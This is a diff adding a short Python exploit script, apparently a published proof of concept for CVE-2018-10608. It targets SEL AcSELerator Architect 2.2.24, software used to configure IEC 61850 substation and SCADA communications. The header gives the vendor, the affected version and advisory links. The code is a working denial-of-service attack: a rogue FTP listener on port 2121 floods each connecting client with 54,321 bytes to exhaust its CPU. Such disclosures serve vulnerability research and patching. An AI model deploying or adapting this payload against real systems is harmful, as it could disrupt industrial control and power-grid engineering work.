@@ -1,0 +1,69 @@
+#!/usr/bin/env python
+# coding: utf8
+#
+#
+# SEL AcSELerator Architect 2.2.24 Remote CPU Exhaustion Denial of Service
+#
+#
+# Vendor: Schweitzer Engineering Laboratories, Inc.
+# Product web page: https://www.selinc.com
+# Affected version: 2.2.24.0 (ICD package version: 2.38.0)
+#
+# Summary: Substation communications networks using the IEC 61850
+# MMS and GOOSE protocols require a systemic methodology to configure
+# message publications and subscriptions. acSELerator Architect
+# SEL-5032 Software is a Microsoft Windows application that streamlines
+# the configuration and documentation of IEC 61850 control and SCADA
+# communications.
+#
+# Description: AcSELerator Architect is prone to a denial-of-service (DoS)
+# vulnerability. An attacker may exploit this issue to cause CPU exhaustion,
+# resulting in application rendered non-responsive (AppHangB1 event).
+#
+# Tested on: Microsoft Windows 7 Ultimate SP1 (EN) 32bit
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#
+#
+# Advisory: https://applied-risk.com/index.php/download_file/view/106/165
+# ICS-CERT: https://ics-cert.us-cert.gov/advisories/ICSA-18-191-02
+# CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-10608
+#
+# 22.02.2018
+#
+
+from pwn import *
+
+cool_data = '\x4A' * 54321
+
+def bunn():
+
+    print """
+    ####################################
+     SEL AcSELerator Architect 2.2.24.0
+      FTP Client Remote CPU Exhaustion
+                 
+                 (c) 2018
+    ####################################
+    """
+
+def main():
+
+    p = listen(2121)
+    try:
+        log.warn('Payload ready for deployment...(Ctrl-C for exit)\n')
+        while True:
+            p.wait_for_connection()
+            if p:
+                sys.stdout.write('▓≡')
+                p.send(cool_data)
+    except KeyboardInterrupt:
+        p.success('OK!')
+        p.close()
+    except EOFError:
+        print "Unexpected error brah:", sys.exc_info()[0]
+        p.close()
+
+if __name__ == '__main__':
+    bunn()
+    main()
